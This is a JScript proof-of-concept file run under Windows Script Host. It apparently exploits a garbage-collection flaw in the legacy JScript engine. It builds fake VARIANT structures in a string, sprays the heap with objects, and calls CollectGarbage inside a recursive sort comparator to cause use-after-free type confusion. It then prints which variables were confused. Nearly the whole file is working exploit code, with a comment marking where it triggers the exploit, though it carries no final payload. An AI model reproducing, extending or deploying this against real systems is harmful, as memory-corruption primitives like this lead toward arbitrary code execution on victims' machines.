function makeVariant(type, obj_ptr_lower, obj_ptr_upper, next_ptr_lower, next_ptr_upper) { // Make a variant
    var charCodes = new Array();
    charCodes.push(
         // type
        type, 0, 0, 0,

         // obj_ptr
        obj_ptr_lower & 0xffff, (obj_ptr_lower >> 16) & 0xffff, obj_ptr_upper & 0xffff, (obj_ptr_upper >> 16) & 0xffff,

        // next_ptr
        next_ptr_lower & 0xffff, (next_ptr_lower >> 16) & 0xffff, next_ptr_upper & 0xffff, (next_ptr_upper >> 16) & 0xffff
        );
    return String.fromCharCode.apply(null, charCodes);
}


// Start with 16 bytes of padding to correctly align (Each string character is UTF-16)
var variants = "AAAAAAAA"; // 1 unicode char is 41 00 which is 2 bytes, 2 x 8 = 16

while(variants.length < 0x239) {
// Generate a number of variants with type 3 (int) and the value 1234
    variants += makeVariant(0x0003, 1234, 0x00000000, 0x00000000, 0x00000000);
}

var size = 20000

var depth = 0;

// Will be used to create VVAL structures
var overlay = new Array();

for(var i=0; i < size*2; i++) {
// Create a large number of arrays for later
// we can use objects here 
    overlay[i] = new Object();
}

var spray = new Array();

for(var i = 0; i < size; i++) spray[i] = new Object();

var typeConfusionedIndices = "";

function compare(untracked_1, untracked_2) {
    if(depth == 100) {
        for(var i=0; i < size; i++) spray[i] = 0;
        CollectGarbage();
        for(var i=0; i < size*2; i++) {
            overlay[i][variants] = 1;
        }
    } else {
        untracked_1 = spray[depth*2];
        untracked_2 = spray[depth*2 + 1];
        if (depth == 0) { WScript.Echo("untracked_1 is a " + typeof untracked_1 + " and untracked_2 is a " + typeof untracked_1) }
        var tempDepth = depth
        depth += 1;
        [0,0].sort(compare);
        if(typeof untracked_1 === "number" || typeof untracked_2 === "number") { 
            typeConfusionedIndices += tempDepth.toString() ; 
            typeConfusionedIndices += " " 
        }
    }
    return 4;
}

// Trigger the exploit
[0,0].sort(compare);


WScript.Echo("Out of n pairs of variables, the following have been successfully type confused: " + typeConfusionedIndices)